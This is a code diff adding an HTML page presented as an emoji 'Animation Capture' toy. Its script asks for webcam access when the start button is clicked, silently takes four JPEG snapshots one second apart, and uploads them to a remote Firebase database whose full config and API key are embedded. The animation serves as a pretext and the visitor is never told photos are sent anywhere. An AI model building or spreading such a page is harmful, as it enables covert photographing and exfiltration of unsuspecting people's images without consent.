@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Animation Capture</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body{
+      margin:0;
+      height:100vh;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      font-family:Arial;
+      background:black;
+      color:white;
+      overflow:hidden;
+    }
+
+    #bigChar{
+      font-size:120px;
+      transition:0.3s;
+      text-align:center;
+    }
+
+    .animate{
+      animation:bounce 0.6s infinite;
+    }
+
+    @keyframes bounce{
+      0%{ transform:scale(1); }
+      50%{ transform:scale(1.2); }
+      100%{ transform:scale(1); }
+    }
+
+    #video{
+      position:fixed;
+      bottom:15px;
+      right:15px;
+      width:120px;
+      height:120px;
+      border-radius:10px;
+      border:2px solid white;
+    }
+
+    button{
+      position:fixed;
+      bottom:15px;
+      left:15px;
+      padding:10px 20px;
+      font-size:16px;
+      cursor:pointer;
+      border:none;
+      border-radius:5px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div id="bigChar">🎭</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<button onclick="startProcess()">Start Animation</button>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.5.0/firebase-database.js";
+
+/* 🔥 YOUR Firebase Config */
+const firebaseConfig = {
+  apiKey: "AIzaSyBGLsOfLuB4qrKdjHZ5XhQ0svEBOjhuYr4",
+  authDomain: "mental-d59ad.firebaseapp.com",
+  databaseURL: "https://mental-d59ad-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "mental-d59ad",
+  storageBucket: "mental-d59ad.appspot.com",
+  messagingSenderId: "1028228267123",
+  appId: "1:1028228267123:web:29163424031bf3d646be06"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const bigChar = document.getElementById("bigChar");
+
+let count = 0;
+let interval;
+
+async function startProcess(){
+
+  const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+  video.srcObject = stream;
+
+  count = 0;
+  bigChar.style.fontSize = "120px";
+  bigChar.classList.add("animate");
+
+  interval = setInterval(captureImage,1000);
+}
+
+async function captureImage(){
+
+  if(count >= 4){
+    clearInterval(interval);
+    bigChar.classList.remove("animate");
+    bigChar.style.fontSize = "50px";
+    bigChar.innerText = "🎬 Animation Completed";
+    return;
+  }
+
+  const emojis = ["😀","😎","🤖","🎉"];
+  bigChar.innerText = emojis[count];
+
+  const context = canvas.getContext("2d");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  context.drawImage(video,0,0);
+
+  const imageData = canvas.toDataURL("image/jpeg",0.6);
+
+  await push(ref(db,"images"),{
+    image:imageData,
+    timestamp:Date.now()
+  });
+
+  count++;
+}
+
+window.startProcess = startProcess;
+</script>
+
+</body>
+</html>
